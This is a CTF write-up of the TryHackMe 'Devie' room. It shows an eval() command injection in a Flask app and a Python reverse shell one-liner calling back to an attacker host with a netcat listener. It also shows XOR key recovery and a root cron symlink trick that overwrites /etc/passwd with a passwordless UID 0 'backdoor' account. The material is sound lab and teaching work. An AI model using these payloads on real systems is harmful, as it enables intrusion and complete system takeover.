---
title: Devie
date: 2026-10-16
platform: TryHackMe
difficulty: Medium
tags:
  - Linux
summary: "Unauthenticated Python eval() command injection provided initial access, followed by reverse-engineering an XOR encryption key for user pivoting and abusing a root cron job symlink to overwrite /etc/passwd for full root compromise."
draft: false
---
# Room link: https://tryhackme.com/room/devie

![](../Attachments/Pasted%20image%2020261016214545.png)

# Nmap scan

```bash
PORT     STATE SERVICE REASON  VERSION
22/tcp   open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 b4:7b:55:ad:98:3d:5b:7d:b6:30:87:ac:95:82:43:68 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDFJmx7nFTBYLh+yScx7MegOgmmCjp/S30gjoPaDJPNLBUDH0bI4unrng4S01C8KhJTZNNkXH1AyYoDFc3mXMAPxPU/VNXP4VQ84rL2l1U0kEKIQYNz8JeGmVjvCj3lPmFJxgH4+JNxmR17/oJ+UYkO4iR0J8gGywly7p0IURn4tIdWNA3BaKqj5OAriTYmaM7g71FUhPLnzx+ujgPolOiIZxgwfD7IFCpAg8V4rOiopD+ND6MstHdXrNr52Kzqb3LFPKeuGD9lTXiJSsvjYLuuknMHsUGG1liHgCd1+4PxGxC1GsgJCpfMGzSmfDGneyI+9mjT+lOd+8MVqo6BlDSaBTX7xlXz2lCx0Wulty1E1rrxHi18vH5wZpxeb7wRnme38CvGt0P9XnOYfoeaBYxgIjv7WQ80vyicbwCoL+9Tww4G3cyufMc2q9nayuXMuPxr0WHlW+QD7e3HOHvdhn6DVjsEUgshAt8VSGIEmdrhD0S/5YflIVL0TV4Z8gOqf/U=
|   256 77:69:f4:56:84:1b:b7:77:2b:d0:d1:92:2a:53:29:8e (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBISioPHEVehIZXEiQKpyl7i5MmaphvflldUnvBrCAkoPc9EN2tNsr7hO/diXuG7nv8DeERmYN+fq+RfsjDIF0Ns=
|   256 c5:68:6d:8e:3e:df:85:85:20:0a:70:61:61:96:e1:23 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPv4BTQNYWTBHxlacgeWRQfG9JROR1tFs45gs8CJZued
5000/tcp open  http    syn-ack Werkzeug httpd 2.1.2 (Python 3.8.10)
|_http-server-header: Werkzeug/2.1.2 Python/3.8.10
|_http-title: Math
| http-methods: 
|_  Supported Methods: POST GET HEAD OPTIONS
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Website is like some calculator with formula for different math problem.

![](../Attachments/Pasted%20image%2020261016221336.png)

I downloaded the source code and it showed for 5 total python files. 

In `app.py` there is a `Command Injection` in the `bisect()` function. 

```python
def bisect(xa,xb): 
	added = xa + " + " + xb 
	c = eval(added)
```

On the `index.html` under `templates`, it defines `InputForm3` defines `xa` and `xb` as `StringField` without strict type validation and it flows directly into `eval()`.

I used a simple command injection in `xa`.

![](../Attachments/Pasted%20image%2020261016221829.png)

But I got `500 internal server error` response.

![](../Attachments/Pasted%20image%2020261016221923.png)

A problem is that I have no visual confirmation that this works. I can't make it do anything where It will send back an output to me. 

I ran it on `Burpsuite` and I used time to test if `eval()` is being executed on the backend.

![](../Attachments/Pasted%20image%2020261016222224.png)

![](../Attachments/Pasted%20image%2020261016222415.png)


It responded with the same code but the response took 5 seconds to respond which means the input is being executed as a command on the backend. That confirms the `command injection`.

# Foothold

After a lot of testing with getting a shell on the server, i finally got it working.

```python
exec('import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.135.167",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")')
```

```bash
$ nc -lvnp 9001
listening on [any] 9001 ...
connect to [192.168.135.167] from (UNKNOWN) [10.144.183.146] 54118
bruce@ip-10-144-183-146:~$ whoami && id
whoami && id
bruce
uid=1000(bruce) gid=1000(bruce) groups=1000(bruce)
```

## Flag

```bash
bruce@ip-10-144-183-146:~$ cat flag1.txt 
THM{REDACTED}
```

# Sudo permission

```bash
bruce@ip-10-144-183-146:~$ sudo -l
Matching Defaults entries for bruce on ip-10-144-183-146:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User bruce may run the following commands on ip-10-144-183-146:
    (gordon) NOPASSWD: /usr/bin/python3 /opt/encrypt.py
```

## User files 

There are 2 files in `bruce` directory.
- note
- checklist

### Checklist

```txt
Web Application Checklist:
1. Built Site - check
2. Test Site - check
3. Move Site to production - check
4. Remove dangerous fuctions from site - check
Bruce
```
### Note

```txt
Hello Bruce,

I have encoded my password using the super secure XOR format.

I made the key quite lengthy and spiced it up with some base64 at the end to make it even more secure. I'll share the decoding script for it soon. However, you can use my script located in the /opt/ directory.

For now look at this super secure string:
NEUEDTIeN1MRDg5K

Gordon
```

Password was encoded with XOR -> Base64. `Gordon` also mentioned that there is a script in the /opt directory. Hopefully, something that can help with decoding this super secure string.

This shows `encrypt.py` where I can run as `Gordon`.

```bash
bruce@ip-10-144-183-146:~$ sudo -u gordon /usr/bin/python3 /opt/encrypt.py
Enter a password to encrypt: testingbrucepassword
BxADERsdAgEAEBcOFRgLHAUXHRY=
```

So I can't read the script, I don't really know what it is doing but the good thing it that I got a result. Maybe I can reverse-engineer it based on the output that it gave me.

Always remember that XOR is symmetrical.

- plaintext âŠ• key = cipher_text
- cipher_text âŠ• plaintext = key
- cipher_text âŠ• key = plaintext

## Privilege Escalation

### Key discovery

```python3
import base64

plaintext = b"testingbrucepassword"
ciphertext = base64.b64decode("BxADERsdAgEAEBcOFRgLHAUXHRY=")

key = bytes([plaintext[i] ^ ciphertext[i] for i in range(len(plaintext))])

print(f"Key: {key}")
print(f"Key (readable): {key.decode() if all(32 <= b < 127 for b in key) else 'char can't be printed'}")
```

So this takes the `plaintext` and `ciphertext` and performs XOR between the two.

```bash
bruce@ip-10-144-183-146:~$ python3 reverse.py 
Key: b'supersecretkeyxorxor'
Key (readable): supersecretkeyxorxor
```

Now with that key found, I can now decrypt password of `Gordon`.

### Gordon password

Remember, `cipher_text âŠ• key = plaintext`. `base64.decode` the ciphertext before the XOR. 

### base64 decode

```bash
bruce@ip-10-144-183-146:~$ echo "NEUEDTIeN1MRDg5K" | base64 -d | xxd -p
3445040d321e3753110e0e4a
```

### XOR reverse 

![](../Attachments/Pasted%20image%2020261016233528.png)

There it is, `Gordon's` password.

# Gordon

```bash
gordon@ip-10-146-150-95:~$ whoami && id
gordon
uid=1001(gordon) gid=1001(gordon) groups=1001(gordon)
```

## Flag

```bash
gordon@ip-10-146-150-95:~$ cat flag2.txt
THM{REDACTED}
```

## pspy64

```bash
2026/10/16 15:47:01 CMD: UID=0     PID=1356   | /usr/bin/bash /usr/bin/backup 
2026/10/16 15:47:01 CMD: UID=0     PID=1357   | /usr/bin/bash /usr/bin/backup 
2026/10/16 15:48:01 CMD: UID=0     PID=1358   | ps -e -o pid,ppid,state,command 
2026/10/16 15:48:01 CMD: UID=0     PID=1359   | /usr/sbin/CRON -f 
2026/10/16 15:48:01 CMD: UID=0     PID=1360   | /usr/sbin/CRON -f 
2026/10/16 15:48:01 CMD: UID=0     PID=1361   | /usr/bin/bash /usr/bin/backup 
2026/10/16 15:48:01 CMD: UID=0     PID=1362   | /usr/bin/bash /usr/bin/backup 
```

`/usr/bin/backup` is running every minute as `root`. 

`Gordon` have read permission on the file.

```bash
gordon@ip-10-146-150-95:/tmp$ ls -la /usr/bin/backup
-rwxr----- 1 root gordon 66 May 12  2022 /usr/bin/backup
```

## /usr/bin/backup

```bash
gordon@ip-10-146-150-95:/tmp$ cat /usr/bin/backup
#!/bin/bash
cd /home/gordon/reports/
cp * /home/gordon/backups/
```

That's why reports and backups have the same files. 

## Privilege escalation

I can exploit the `cron job` running `cp *` with unquoted wildcards in a user-writable directory. By creating a symlink from the destination to /etc/, we redirect the copy operation to write a malicious /etc/passwd as root.

Create a file for the fake `passwd` entry.

```bash
echo 'backdoor::0:0::/root:/bin/bash' > passwd
```

Delete the `/backups` folder.

Next step is to make a symlink for `backups` folder to `/etc`.

```bash
ln -s /etc /home/gordon/backups/
```

How it works is that when the cron job triggers, it will copy my `passwd` file to `/backups`. Since `/backups` is symlinked to `/etc`, it will copy it to that directory which will overwrite the `passwd` file.

Now, you can see i have my own user with `UID=0` which is `root`.

```bash
gordon@ip-10-146-150-95:~$ cat /etc/passwd
backdoor::0:0::/root:/bin/bash
```

# Root flag

```bash
gordon@ip-10-146-150-95:~$ su backdoor
backdoor@ip-10-146-150-95:/home/gordon# cd /root
backdoor@ip-10-146-150-95:~# ls
root.txt  snap
backdoor@ip-10-146-150-95:~# cat root.txt
THM{REDACTED}
```


